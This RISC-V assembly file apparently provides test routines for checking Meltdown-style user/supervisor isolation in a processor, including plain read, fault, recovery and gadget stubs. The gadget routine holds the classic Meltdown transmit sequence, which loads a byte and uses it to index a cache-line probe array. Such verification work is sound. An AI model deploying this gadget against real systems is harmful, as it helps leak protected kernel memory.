  .section ".text"
  .align 2
  .globl meltdown_us_user_read_ok
meltdown_us_user_read_ok:
  lb t0, 0(a0)
  ecall

  .align 2
  .globl meltdown_us_user_fault_only
meltdown_us_user_fault_only:
  lb t0, 0(a0)
  ecall

  .align 2
  .globl meltdown_us_user_gadget
meltdown_us_user_gadget:
  fence rw, rw
  lb   t0, 0(a0)
  slli t0, t0, 6
  add  t0, t0, a1
  ld   t1, 0(t0)
  ecall

  .align 2
  .globl meltdown_us_user_recover
meltdown_us_user_recover:
  ecall
